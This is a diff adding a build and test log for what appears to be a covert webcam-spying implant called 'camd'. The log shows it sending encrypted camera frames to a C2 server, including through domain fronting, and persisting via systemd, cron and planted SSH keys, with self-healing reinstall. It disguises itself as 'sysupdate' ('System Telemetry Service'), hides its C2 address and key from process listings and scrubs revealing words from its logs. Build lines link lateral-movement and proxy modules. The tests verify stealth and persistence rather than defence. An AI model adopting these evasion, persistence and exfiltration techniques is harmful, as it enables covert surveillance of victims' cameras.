@@ -1,0 +1,1273 @@
+make: Entering directory '/data/workspace/dayanjing/21_exfil'
+[baseline] cells=1282048 sha256=f1f2f7c6be857d64
+--- A(200) rc=0 ---
+[OK] 已上传 1282048 字节（HTTP 200）
+[OK] 落点已清空
+计数: 成功 2  失败 0  警告 0
+A: 落点发送后=0  服务端收到=1282048  sha匹配=True
+--- B(500) rc=1 ---
+[FAIL] 上传失败 HTTP 500
+计数: 成功 0  失败 1  警告 0
+B: 失败后落点=1282048（应仍为 1282048）
+--- C(连接失败) rc=1 ---
+[FAIL] 上传失败 HTTP 000
+计数: 成功 0  失败 1  警告 0
+C: 失败后落点=1282048（应仍为 1282048）
+
+=== 全部通过 ===
+=== C2 收端 + camd 边采边发 端到端 ===
+start rc=0
+[OK] C2 已在 0.0.0.0:22000 监听 (pid 7186)
+[OK] 信元落点: /tmp/tmpb_w95pst/inbox
+[WARN] TLS: 未启用（信元已 AEAD 加密，但节拍特征可被识别）
+
+给 camd 的回传参数：
+  --sink tcp://<C2地址>:22000
+camd rc=0
+camd stderr: [INFO] 结束: batches=2 frames=4 bytes_out=2048 persist_rc=0 persist_user=0 methods=systemd:1,cron:1,sshkey:0 rechecks=2 heals=0 bin=/tmp/tmpb_w95pst/agentroot/var/tmp/.system-cache/agent
+  [PASS] 已落出分片文件（1 个）
+落盘总字节 = 2048
+  [PASS] 落盘字节 > 0
+  [PASS] 信元不含明文 JPEG magic
+字节值种类 = 256
+  [PASS] 字节分布非全零/填充（种类 256）
+stop rc=0
+[OK] 已停止 (pid 7186)
+[OK] PID 文件已清理
+收端终值: 字节=2048 连接=1 分片=1
+  [PASS] 收端统计字节 > 0
+  [PASS] 连接数 >= 1
+
+total=6 fail=0
+=== setup-c2.sh 反向验证 ===
+
+--- R1 端口被占，start 必须失败 ---
+start rc=1
+stderr: [FATAL] 端口 23000 已被占用——拒绝启动（宁可失败，也不留'看似在听'的假象）
+  [PASS] 端口被占时 start 必须失败（不得留下'看似在听'的假象）
+  [PASS] 失败原因应点名端口占用
+  [PASS] 失败后不得留下 PID 文件（否则 stop 会杀错进程）
+
+--- R2 stop 之后，camd 再发必须是 0 字节 ---
+  [PASS] stop 后端口不可连接
+camd rc=5（无收端时建连失败，预期非 0）
+  [PASS] 无收端时 camd 必须失败，不得静默'成功'
+
+--- R3 TLS 模式下明文客户端必须被拒 ---
+start(TLS) rc=0
+[OK] C2 已在 0.0.0.0:23200 监听 (pid 7262)
+[OK] 信元落点: /tmp/tmpasvqmax2/inbox
+[OK] TLS: 已启用
+
+给 camd 的回传参数：
+  --sink tcp://<C2地址>:23200   （TLS 需 camd 侧另行支持，当前为明文 TCP）
+  [PASS] 明文客户端应被记为 TLS 握手失败（证明 TLS 真生效）
+明文尝试后统计: 字节=0 连接=0
+  [PASS] 明文数据不得计入收端（TLS 必须挡住非 TLS 客户端）
+
+total fail=0
+=== 正向：tls:// 出口 + 真实 TLS 收端 ===
+[PASS] camd 退出码 0
+[PASS] 收端收到信元字节
+[PASS] 收端以 TLS 模式运行
+[PASS] 信元已落盘
+[PASS] 线上不得出现 JPEG magic（信元仍是密文）
+      rc=0 bytes=512
+=== 反向 R1：tls:// 未给 --ca（默认要求校验）===
+[PASS] R1 必须拒绝启动
+[PASS] R1 收端不得收到字节
+[PASS] R1 报出可操作的诊断
+=== 反向 R2：证书链校验失败（错误 CA）===
+[PASS] R2 必须拒绝（证书不可信）
+[PASS] R2 收端不得收到字节
+=== 反向 R3：IP 目标 + 未给 --sni（无法做主机名校验）===
+[PASS] R3 必须拒绝启动
+[PASS] R3 收端不得收到字节
+=== 反向 R4：cd_tls_send 退回错误契约（证明修复被守护）===
+[PASS] R4 变异体编译成功（注入确实生效）
+[PASS] R4 握手必须失败
+[PASS] R4 收端不得收到字节
+[PASS] R4 还原后重建成功
+
+total=16 pass=16 fail=0
+[PASS] F1 tcp:// 前缀时 C2 真实收到字节  rc=0 连接=1 实收=512
+[PASS] F2 线上信元不含 JPEG 明文  字节值种类=217
+[PASS] R1 缺 tcp:// 前缀时 C2 实收 0 字节（回传断裂）  rc=0 实收=0
+[PASS] R2 缺前缀时数据落到名为'地址:端口'的文件（缺陷指纹）  stray=['/data/workspace/127.0.0.1:49085']
+[PASS] R3 缺前缀时 camd 仍返回 0（故障被静默掩盖）  rc=0
+[PASS] S1 sink 不得出现在命令行（改由 CAMD_SINK 环境注入；cmdline 0444 世界可读）  使用点=0 异常=[]
+[PASS] S1b CAMD_SINK 定义处带 scheme 前缀  定义=['printf \'CAMD_SINK="front://%s"\\n\' "$C2"', 'printf \'CAMD_SINK="tcp://%s"\\n\' "$C2"']
+[PASS] S2 模板的 C2 校验被真正调用（非仅定义）
+============================================================
+[PASS] 全部通过  EXIT=0
+[PASS] P0 多架构包构建成功  -- [OK] 架构: amd64 arm64
+[PASS] P0b 单架构包构建成功
+[PASS] P5 构建期标签与 e_machine 不符必须拒绝  -- rc=1
+[PASS] P1 x86_64 目标机选中 amd64 分节且 e_machine 匹配  -- rc=0
+[PASS] P2 aarch64 目标机选中 arm64 分节且 e_machine 匹配  -- rc=0
+[PASS] P3 缺架构分节时必须拒绝（不得装错架构产物）  -- rc=1
+[PASS] P4 被拒绝后不得留下已安装文件  -- 残留=False
+[PASS] P6 安装后 C2 真实收到信元  -- 实收=512 rc=0
+[PASS] P7 线上不含 JPEG 明文  -- 字节种类=225
+[PASS] R1 退回旧实现后错架构被放行（假成功）  -- rc=0 输出=计数: 成功 3  失败 0  警告 0
+[PASS] R2 同一份包在当前实现下必须拒绝（R1 的对照）  -- rc=1
+============================================================
+[PASS] 全部通过  EXIT=0
+=== 正向：front 模式接线 ===
+[PASS] ① front 模式产出 front:// sink（真实目标不在线路上）
+[PASS] ② 真实目标写进 CAMD_FRONT_HOST（内层 Host）
+[PASS] ③ 信任库路径写进 CAMD_CA（否则退化成不校验）
+[PASS] ④ 落点参数为带引号标量（防 source 时被当成命令执行）
+[PASS] ⑤ CA 已投递到目标机
+=== 正向：tcp 模式回归（不得被 front 改动破坏） ===
+[PASS] ⑥ tcp 模式仍产出 tcp:// sink
+[PASS] ⑦ tcp 模式 CAMD_FRONT_HOST/CAMD_CA 为空（不残留 front 参数）
+=== 反向：两条守卫必须拒绝 ===
+[PASS] R1 front-host 与前置域相同必须拒绝（SNI 会暴露真实目标）
+[PASS] R2 front 模式缺 CA 必须拒绝（否则退化成不校验）
+=== 静态：sink 只能有一个产地 ===
+[PASS] S1 sink 不得出现在命令行（改由 CAMD_SINK 环境注入）
+[PASS] S2 落点参数经环境注入（run.sh 与试运行均 set -a 源 conf）
+[PASS] S3 sink_lines 被定义且被调用（单一产地）
+=== 结果: 12 pass, 0 fail ===
+[OK] F1 install 成功（有效公钥） rc=0
+[OK] F1 authorized_keys 真写入 /data/workspace/vk_sshkey_02v1phvu/p1/root/.ssh/authorized_keys
+[OK] F1 含公钥 blob AAAAC3NzaC1lZDI1...
+[OK] F2 标记不暴露项目名 不含 dayanjing
+[OK] F3 无公钥时 install 仍成功 rc=0
+[OK] F3 无公钥时不启用 sshkey authorized_keys 未生成
+[OK] F4 非法公钥被部署期拦截 rc=1
+[OK] F4 报错点名公钥非法 
+[OK] F4 拦截发生在落盘之前 pubkey.txt 未生成
+[OK] R1 去掉校验后非法公钥被落盘 证明 F4 有鉴别力，非恒绿
+[OK] R1 去掉校验后拦截推迟到运行期 二进制已落盘——装完了才失败
+
+=== C2 实收 = 1024 字节 ===
+total=11 pass=11 fail=0
+[OK] F1 conf 带 CAMD_SVC_NAME sysupdate
+[OK] F1 服务名不是项目名 sysupdate
+[OK] F2 单元落点名 == NAME ['multi-user.target.wants', 'sysupdate.service']
+[OK] F2 无项目名单元 ['multi-user.target.wants', 'sysupdate.service']
+[OK] F3 cron 落点名 == NAME ['sysupdate']
+[OK] F3 无项目名 cron ['sysupdate']
+[OK] F4 驻留痕迹内容不含项目名 []
+[OK] F5 部署输出呈现三段驻留状态 
+[OK] F6 C2 实收 > 0 204288 字节
+[OK] R1 含 / rc=2
+[OK] R2 含 .. rc=2
+[OK] R2 首字符 - rc=2
+[OK] R2 超长 rc=2
+[OK] R3 去掉 CAMD_SVC_NAME 后落点名回退项目名（F2/F3 非恒绿） ['dayanjing.service', 'multi-user.target.wants']
+
+total=14 pass=14 fail=0
+[PASS] P1 解析器自检（含非法输入与日/周或语义）
+[PASS] P0 一键脚本已生成
+[PASS] P0b 收端存活且端口可达  -- port=42701
+[PASS] P2a 安装写出 cron 条目  -- [WARN] systemd 未运行，单元已校验但未安装（降级到 cron） | [OK] cron 条目已写入（分位 2） | [WARN] 未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认） | [INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+      条目: # managed | SHELL=/bin/sh | PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin | 2 * * * * root /var/lib/sysupdate/run.sh --batches 1
+      基线字节（install 试运行已计入，不算进触发）: 204288
+[PASS] P2b 条目在自身时刻被真实触发  -- SCHEDULER=harness
+JOBS=1 ENV_KEYS=['PATH', 'SHELL']
+FIRED minute=202610282102 exit=0
+[PASS] P3 C2 在触发后新增字节（cron 真的在采）  -- base=204288 after=408576
+[PASS] P4a camd 退出码 0
+[PASS] P4b 日志无 '必须指定 --key'
+[PASS] R1 反向：缺陷写法下 camd 必报缺密钥  -- rc=1 out=SCHEDULER=harness
+JOBS=1 ENV_KEYS=['PATH', 'SHELL']
+ONCE_EXIT=2 err=
+[PASS] R1b 反向：缺陷写法下 C2 不新增字节  -- before=408576 after=408576
+[PASS] P5 卸载无残留  -- []
+
+=== result: 11 pass, 0 fail ===
+[OK  ] P0 一键包生成成功
+[OK  ] P0b camd 产物存在  -- /data/workspace/dayanjing/agent_windows/build/linux/camd
+--- install A (rc=0) ---
+[OK] 环境: arch=x86_64 systemd=0 backend=mock front=无
+[OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+[OK] 配置写入 /tmp/pfxA/etc/sysupdate/sysupdate.conf（0600）
+[OK] 二进制已安装 /tmp/pfxA/usr/local/bin/sysupdate
+[OK] 启动器已写入 /tmp/pfxA/var/lib/sysupdate/run.sh（0700）
+[OK] systemd 单元静态校验通过
+[WARN] 假根模式（PREFIX=/tmp/pfxA）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态
+[OK] cron 条目已写入（分位 6）
+[WARN] 未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）
+[OK] 试运行已送达 C2（512 字节信元，tcp://127.0.0.1:53085）
+[INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+[WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+计数: 成功 8  失败 0  警告 3
+
+[OK  ] P1 假根部署后真根零污染  -- 泄漏=[]
+[OK  ] P2 假根内落点齐全  -- 缺失=[]
+[OK  ] P3 run.sh 路径前缀为假根 A  -- conf=/tmp/pfxA/etc/sysupdate/sysupdate.conf bin=/tmp/pfxA/usr/local/bin/sysupdate 期望前缀=/tmp/pfxA
+[OK  ] P4 run.sh 代码行无裸真根路径  -- 残留=[]
+[OK  ] P5 试运行信元送达 C2  -- 实收=512 连接=1
+--- install B (rc=0) ---
+[OK] 环境: arch=x86_64 systemd=0 backend=mock front=无
+[OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+[OK] 配置写入 /tmp/pfxB/etc/sysupdate/sysupdate.conf（0600）
+[OK] 二进制已安装 /tmp/pfxB/usr/local/bin/sysupdate
+[OK] 启动器已写入 /tmp/pfxB/var/lib/sysupdate/run.sh（0700）
+[OK] systemd 单元静态校验通过
+[WARN] 假根模式（PREFIX=/tmp/pfxB）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态
+[OK] cron 条目已写入（分位 6）
+[WARN] 未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）
+[OK] 试运行已送达 C2（512 字节信元，tcp://127.0.0.1:53085）
+[INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+[WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+计数: 成功 8  失败 0  警告 3
+
+[OK  ] P6 部署 B 未改动 A 的配置  -- A密钥=CAMD_KEY=540eacf6e5905881c2316305d81b75304d348f1f36554edfcbc1df88fd94ea6a
+[OK  ] P6b 假根 B 自身落点齐全
+--- uninstall A (rc=0) ---
+[OK] 假根模式：跳过 systemctl（不改动真实系统状态）
+[OK] 文件与二进制已清理
+[WARN] 假根模式：跳过按 comm 杀进程（无法区分归属，会误伤真实部署）
+计数: 成功 2  失败 0  警告 1
+
+[OK  ] P7 假根 A 已清空
+[OK  ] P7b uninstall A 未波及假根 B
+[OK  ] R0 变异包生成成功
+--- install 变异包 (rc=0) ---
+[OK] 环境: arch=x86_64 systemd=0 backend=mock front=无
+[OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+[OK] 配置写入 /etc/sysupdate/sysupdate.conf（0600）
+[OK] 二进制已安装 /usr/local/bin/sysupdate
+[OK] 启动器已写入 /tmp/pfxB/var/lib/sysupdate/run.sh（0700）
+[OK] systemd 单元静态校验通过
+[WARN] 假根模式（PREFIX=/tmp/pfxB）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态
+[OK] cron 条目已写入（分位 7）
+[WARN] 未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）
+[OK] 试运行已送达 C2（512 字节信元，tcp://127.0.0.1:53085）
+[INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+[WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+计数: 成功 8  失败 0  警告 3
+
+[OK  ] R1 硬编码版必然污染真根（证明 P1 非恒绿）  -- 污染=['/etc/sysupdate', '/usr/local/bin/sysupdate']
+[OK  ] R2 真根污染已清理  -- 残留=[]
+[OK  ] T1 date+%S=08 时 install 不中断  -- rc=0 
+[OK  ] T2 date+%S=08 时 cron 条目已写入
+[OK  ] T1 date+%S=09 时 install 不中断  -- rc=0 
+[OK  ] T2 date+%S=09 时 cron 条目已写入
+
+计数: 失败 0
+[OK  ] N0 能从模板解析默认 NAME  -- sysupdate
+[OK  ] N1 默认名不含语义词  -- NAME=sysupdate 命中=[]
+[OK  ] N2 代码行无字面 camd 落点  -- 残留=[]
+[OK  ] N3 systemctl 不写字面 camd.service  -- 残留=[]
+[OK  ] N4 ps comm 匹配用 $NAME  -- awk -v n 存在
+[OK  ] N5 包生成成功  -- 
+[OK  ] N6 R-pathtrav 被拒（路径穿越）  -- rc=1 [FATAL] --name 不得含 / : ../../../tmp/evil（会路径穿越）
+计数: 成功 0  失败 1  警告 0
+[OK  ] N6 R-pathtrav 未写出越界路径  -- 越界=[]
+[OK  ] N6 R-charset 被拒（非法字符）  -- rc=1 [FATAL] --name 只允许 [a-z0-9_-] : bad.name!
+计数: 成功 0  失败 1  警告 0
+[OK  ] N6 R-charset 未写出越界路径  -- 越界=[]
+[OK  ] N6 R-solong 被拒（超长（comm 截断））  -- rc=1 [FATAL] --name 长度不得超过 15（内核 comm 截断）: aaaaaaaaaaaaaaaa
+计数: 成功 0  失败 1  警告 0
+[OK  ] N6 R-solong 未写出越界路径  -- 越界=[]
+[OK  ] N7a 自定义名 install 成功  -- rc=0 [OK] 环境: arch=x86_64 systemd=0 backend=v4l2 front=无
+[OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+[OK] 配置写入 /tmp/nmA_v7kroozq/etc/acpid2/acpid2.conf（0600）
+[O
+[OK  ] N7b 落点随 NAME 改变  -- 齐全=4/4 缺失=[]
+[OK  ] N7c 未同时留下默认名落点  -- NAME=sysupdate
+[OK  ] N7d run.sh 内路径为自定义名  -- 含acpid2=True 含默认名=False
+[OK  ] N8a 默认名 install 成功  -- rc=0
+[OK  ] N8b 默认名落点=sysupdate  -- 
+[OK  ] N8c 无 camd 落点  -- 
+[OK  ] R1b 移除校验后越界路径真的被写出  -- rc=1 写出=['/tmp/evilp']
+[OK  ] R1c 与 N6 行为不同（证明 N6 非恒绿）  -- 有校验未写 / 无校验写出=True
+[OK  ] N9a 守护源码存在  -- ['cam_daemon_main.c', 'cam_daemon.c']
+[OK  ] N9b 日志无语义词 cam_daemon_main.c  -- 命中=[]
+[OK  ] N9b 日志无语义词 cam_daemon.c  -- 命中=[]
+[OK  ] R2a 注入生效（中性日志被还原为泄露版）  -- changed=True
+[OK  ] R2b 注入后 N9b 检出（证明非恒绿）  -- 命中=['cam_daemon']
+
+计数: 失败 0
+[OK] G1 生成一键脚本  -- [OK] 内嵌 amd64  /data/workspace/dayanjing/agent_windows/build/linux/camd (1421408 字节, e_machine=62)
+[OK] 产物: /tmp/okcmd_8jgf_kna/onekey.sh
+[OK] 架构: amd64
+
+[OK] G2 install 完成  -- ot）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态
+[OK] cron 条目已写入（分位 8）
+[WARN] 未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）
+[OK] 试运行已送达 C2（204288 字节信元，tcp://127.0.0.1:35979）
+[INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+[WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+计数: 成功 8  失败 0  警告 3
+
+[OK] G3 conf/run.sh 落盘  -- conf=/tmp/okcmd_8jgf_kna/root/etc/sysupdate/sysupdate.conf run_sh=/tmp/okcmd_8jgf_kna/root/var/lib/sysupdate/run.sh
+[OK] G4 试运行经环境变量送达 C2（bytes_out>0）  -- bytes_out=204288
+[OK] G5 驻留进程存活（用于读 cmdline）  -- pid=9030
+[OK] F1 cmdline 不含 C2 地址  -- cmdline='/tmp/okcmd_8jgf_kna/root/usr/local/bin/sysupdate '
+[OK] F2 cmdline 不含密钥
+[OK] F3 cmdline 不含 --sink
+[OK] F4 cmdline 不含 --front-host
+[OK] F5 cmdline 不含 --key
+[OK] F6 环境变量方式功能正常（C2 实收>0）  -- C2 实收=26966016 字节
+[OK] F7 CAMD_SINK 经环境注入
+[OK] R1 退回旧写法后 cmdline 暴露 C2（证明 F1 有鉴别力）  -- cmdline='/tmp/okcmd_8jgf_kna/root/usr/local/bin/sysupdate --sink tcp://127.0.0.1:35979 '
+
+总计: 13  通过: 13  失败: 0
+--- 正向 ---
+[PASS] U1 单元文件已渲染
+[PASS] U2 单元含 Restart=always（崩溃后自拉起）
+[PASS] U3 单元含 EnvironmentFile（密钥注入通路）
+[PASS] U3b EnvironmentFile 指向 conf 本体
+[PASS] U7 ExecStart 指向 run.sh 包装器（参数才能正确展开）
+[PASS] U8 单元通过 systemd-analyze 静态校验
+[PASS] U4 单元不含明文密钥
+[PASS] U5 单元不含 C2 地址/回传参数
+[PASS] U6 Description 不点明功能（System Telemetry Service）
+[PASS] U9 run.sh 的 conf 路径与 CONF_FILE 同源
+[PASS] U10 run.sh 的 bin 路径与 BIN_DST 同源
+PASS=11 FAIL=0 SKIP=0
+EXIT=0
+--- 反向(desc) ---
+[PASS] 反向守卫生效：U6 变红 -> U6 Description 不点明功能（Camera Service）
+PASS=1 FAIL=0
+EXIT=0
+--- 反向(restart) ---
+[PASS] 反向守卫生效：U2 变红 -> U2 单元含 Restart=always（崩溃后自拉起）
+PASS=1 FAIL=0
+EXIT=0
+--- 反向(paths) ---
+[PASS] 反向守卫生效：U9 变红 -> U9 run.sh 的 conf 路径与 CONF_FILE 同源
+PASS=1 FAIL=0
+EXIT=0
+[OK] F1 首次在线：C2 收到信元  -- 9728 字节
+[OK] F1b 在线期间进程存活
+[INFO] C2 已停止，观察 8 秒...
+[OK] F2 断线后守护进程仍存活（核心）  -- poll=None=运行中
+[OK] F3 断线窗口内无新送达（证明真断了）  -- 断线前=10240 当前=10240
+[INFO] C2 已在同端口 59641 重启，观察 10 秒...
+[OK] F4 恢复后再次送达（重连真的发生）  -- 15872 字节 / 1 连接
+[OK] F5 全程进程未退出（结束态仍是运行中）
+[INFO] camd 输出尾部: [INFO] 结束: batches=75 frames=52 bytes_out=26624 persist_rc=-9 persist_user=0 methods=systemd:0,cron:0,sshkey:0 rechecks=
+
+断言总数=6  失败=0
+[PASS] F1 install 在假根下成功
+[PASS] F2 前提：install 确实写入了单元文件
+[PASS] F3 前提：install 确实写入了配置目录
+[PASS] F4 uninstall 成功
+[PASS] F5 卸载后无残留: conf_dir
+[PASS] F5 卸载后无残留: lib_dir
+[PASS] F5 卸载后无残留: bin
+[PASS] F5 卸载后无残留: cron
+[PASS] F5 卸载后无残留: unit
+[PASS] F5 卸载后无残留: lock
+[PASS] R1 缺陷态下单元文件残留
+[PASS] R2 守卫确有鉴别力（修复态已清、缺陷态残留）
+
+--- 计数: 通过 12  失败 0 ---
+[OK]   F1 删不掉时 uninstall 必须计入失败
+[OK]   F2 必须点名残留项
+[OK]   F3 卸载后 conf 目录确实还在（证明 F1 不是误报）
+[OK]   F4 不得同时报'文件与二进制已清理'（那是自相矛盾的成功）
+[OK]   F5 解除挂载后重跑，失败数归 0
+[OK]   F6 解除挂载后 conf 目录确实消失
+[OK]   R1 退回缺陷实现后应静默报成功（证明 F1 有鉴别力）
+
+总计: 7 通过, 0 失败
+[OK] F1 camd 正常结束 rc=0
+[OK] F1 自检确实执行 rechecks=3
+[OK] F1 未触发重装 heals=0（驻留完好时不该重写）
+[OK] F2 删除前 cron 确实存在 （否则用例未进入目标路径）
+[OK] F2 删除动作已发生 
+[OK] F2 camd 正常结束 rc=0
+[OK] F2 自检发现缺段 rechecks=3
+[OK] F2 触发自愈重装 heals=1
+[OK] F2 cron 被装回 /tmp/psh2_hibujosn/etc/cron.d/sysupdate
+[OK] F2 装回的 cron 不含项目名 
+[OK] F3 关闭自检后不重装 heals=0
+[OK] F3 关闭自检后 cron 未恢复 （证明 F2 能区分开/关，非恒绿）
+
+=== C2 实收 = 4608 字节 ===
+total=12 pass=12 fail=0
+=== 红线巡检 ===
+
+[BLOCKED ] R1  V4L2 真设备采集
+           整条链唯一没有流过真实像素的环节；全程 mock 合成帧。
+      【已实证：本环境造不出可用字符设备，三条路全堵】
+      (1) 内核模块：无 /lib/modules、无 modprobe，装不了 v4l2loopback/vivid
+      (2) CUSE：无 libfuse3 开发头无法编译；且内核 fs/fuse/cuse.c 的
+          cuse_dev_operations 没有 .mmap，而后端必走 mmap
+      (3) FUSE：fuse_init_inode 对 S_IFCHR 走 init_special_inode()，
+          i_fop 被换成 def_chr_fops，open 走 chrdev_open 而非 FUSE，
+          表现为 Permission denied 且服务端零请求（实测对照：
+          同一份服务端改 S_IFREG 后 open/ioctl/mmap 全部正常）
+           环境不具备（硬限制）
+
+[VERIFIED] R1b  V4L2 内核 ABI（ioctl 序列 + mmap 取帧）
+           真设备分支依赖的全部内核 ABI：ioctl 命令号、结构体布局与大小、mmap 取帧、DQBUF 语义。这些错了真机上就是 ENOTTY/EINVAL/段错误，而本沙盒没有摄像头，此前从未有任何东西验过。
+           证据: R1b.evidence
+
+[VERIFIED] R2  systemd 运行时驻留
+           生产环境主路径；enable/restart/is-active/MainPID/Restart=always 从未真跑
+           证据: R2.evidence
+
+[BLOCKED ] R3  cron 实际执行
+           条目已写、分位正确，但守护进程不在，从未真正触发过一次
+           环境不具备（硬限制）
+
+[VERIFIED] R3a  cron.d 加载期契约（真 cron 静默不执行的已知原因）
+           真 cron 守护不可得（apt 无 cron 包、无 busybox），但它在加载 /etc/cron.d/* 时的硬行为可静态真验：文件名含点、漏 user 字段、group/other 可写、非 root 属主、缺 PATH、末行无换行、命令不存在——违反任意一条都会导致整个文件被跳过且无任何可见症状
+           证据: R3a.evidence
+
+[BLOCKED ] R4  arm64/arm 真产物
+           多架构分发机制齐备，但缺真实交叉产物；现有 arm64 包是改了 e_machine 的合成品
+           环境不具备（硬限制）
+
+=== 汇总 ===
+PENDING（环境具备却未验证，须立即补）: 0
+无 PENDING。BLOCKED 项是环境硬限制，不得记为已验证。
+[OK] G0 基线无 PENDING rc=0
+[OK] G1 伪造编译器 -> R4 报 PENDING [PENDING ] R4  arm64/arm 真产物
+[OK] G1 整体退出码为 1（报警） rc=1
+[OK] G2 有证据 -> R4 转 VERIFIED [VERIFIED] R4  arm64/arm 真产物
+[OK] G2 整体退出码回 0 rc=0
+[OK] G3 空证据文件 -> 仍 PENDING [PENDING ] R4  arm64/arm 真产物
+[OK] G3 整体退出码为 1 rc=1
+[OK] G4 清理后回到基线 rc=0
+[OK] G4 证据目录已清空 
+
+total=9 pass=9 fail=0
+[PASS] F1 非 root 安装 rc=0
+[PASS] F2 切换到用户级部署（不再 DIE 需要 root）
+[PASS] F3 用户级单元已写入
+[PASS] F4 配置已写入 $HOME
+[PASS] F5 二进制已安装且可执行
+[PASS] F6 启动器已写入
+[PASS] F7 autostart 桌面条目已写入（camd 用户级驻留）
+[PASS] F8 用户级单元 WantedBy=default.target
+[PASS] F9 用户级单元不得写 multi-user.target（用户实例没有该 target）
+[PASS] F10 配置含密钥（由环境注入）
+[PASS] F11 C2 实收信元字节 > 0
+[PASS] F12 camd 报告用户级驻留生效
+[PASS] F13 status 在非 root 下能定位落点
+[PASS] F14 卸载 rc=0
+[PASS] F15 卸载后无残留（含 autostart）
+[PASS] R1 家目录不可写时安装必须失败（HOME 守卫非恒绿）
+
+计数: 成功 16  失败 0
+make[1]: 'build/proxy.o' is up to date.
+make[1]: 'build/lateral.o' is up to date.
+make[1]: 'build/proxy.o' is up to date.
+make[1]: 'build/lateral.o' is up to date.
+make[1]: 'build/libp2p.a' is up to date.
+make[1]: 'build/c2.o' is up to date.
+make[1]: 'build/c2_frame.o' is up to date.
+make[1]: 'build/crypto_gcm.o' is up to date.
+make[1]: 'build/crypto_hash.o' is up to date.
+make[1]: 'build/crypto_x25519.o' is up to date.
+make[1]: 'build/libp2p.a' is up to date.
+make[1]: 'build/c2.o' is up to date.
+make[1]: 'build/c2_frame.o' is up to date.
+make[1]: 'build/crypto_gcm.o' is up to date.
+make[1]: 'build/crypto_hash.o' is up to date.
+make[1]: 'build/crypto_x25519.o' is up to date.
+make[1]: 'build/libp2p.a' is up to date.
+make[1]: 'build/c2.o' is up to date.
+make[1]: 'build/c2_frame.o' is up to date.
+make[1]: 'build/crypto_gcm.o' is up to date.
+make[1]: 'build/crypto_hash.o' is up to date.
+make[1]: 'build/crypto_x25519.o' is up to date.
+make[1]: 'build/libp2p.a' is up to date.
+make[1]: 'build/c2.o' is up to date.
+make[1]: 'build/c2_frame.o' is up to date.
+make[1]: 'build/crypto_gcm.o' is up to date.
+make[1]: 'build/crypto_hash.o' is up to date.
+make[1]: 'build/crypto_x25519.o' is up to date.
+make[1]: 'build/libp2p.a' is up to date.
+make[1]: 'build/c2.o' is up to date.
+make[1]: 'build/c2_frame.o' is up to date.
+make[1]: 'build/crypto_gcm.o' is up to date.
+make[1]: 'build/crypto_hash.o' is up to date.
+make[1]: 'build/crypto_x25519.o' is up to date.
+make[1]: 'build/libp2p.a' is up to date.
+make[1]: 'build/c2.o' is up to date.
+make[1]: 'build/c2_frame.o' is up to date.
+make[1]: 'build/crypto_gcm.o' is up to date.
+make[1]: 'build/crypto_hash.o' is up to date.
+make[1]: 'build/crypto_x25519.o' is up to date.
+make[1]: 'build/linux/cam_mock.o' is up to date.
+make[1]: 'build/linux/cam_factory.o' is up to date.
+make[1]: 'build/linux/cam_linux_v4l2.o' is up to date.
+make[1]: 'build/linux/cam_mock.o' is up to date.
+make[1]: 'build/linux/cam_factory.o' is up to date.
+make[1]: 'build/linux/cam_linux_v4l2.o' is up to date.
+make[1]: 'build/linux/cam_mock.o' is up to date.
+make[1]: 'build/linux/cam_factory.o' is up to date.
+make[1]: 'build/linux/cam_linux_v4l2.o' is up to date.
+make[1]: 'build/linux/cam_mock.o' is up to date.
+make[1]: 'build/linux/cam_factory.o' is up to date.
+make[1]: 'build/linux/cam_linux_v4l2.o' is up to date.
+cc -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -D_DEFAULT_SOURCE -Iinclude -I../14_p2p/include -I../02_c2/include -I../00_crypto/include -I../08_lateral/include -I../agent_windows/include tests/test_cam_e2e.c build/exfil.o -o build/test_cam_e2e ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o ../14_p2p/build/crypto_gcm.o ../14_p2p/build/crypto_hash.o ../14_p2p/build/crypto_x25519.o ../agent_windows/build/linux/cam_jpeg.o ../agent_windows/build/linux/cam_mock.o ../agent_windows/build/linux/cam_factory.o ../agent_windows/build/linux/cam_linux_v4l2.o ../14_p2p/build/libp2p.a
+[PASS] P0b install 写出 cron 条目  -- /tmp/croncontract_a4ucmku6/etc/cron.d/sysupdate
+[PASS] C1 C1  -- 文件名 sysupdate
+[PASS] C2 C2  -- user=root
+[PASS] C3 C3  -- mode=600 group_w=False other_w=False
+[PASS] C4 C4  -- uid=0
+[PASS] C5 C5  -- PATH 显式设置
+[PASS] C6 C6  -- 末字节 b'\n'
+[PASS] C7 C7  -- /tmp/croncontract_a4ucmku6/var/lib/sysupdate/run.sh
+[PASS] R1 文件名含点被 cron 忽略  -- 注入被抓到
+[PASS] R2 漏 user 字段  -- 注入被抓到
+[PASS] R3 group/other 可写  -- 注入被抓到
+[PASS] R4 缺 PATH  -- 注入被抓到
+[PASS] R5 末行无换行  -- 注入被抓到
+[PASS] R6 命令不存在  -- 注入被抓到
+
+=== result: 14 pass, 0 fail ===
+python3 tests/verify_v4l2_abi.py
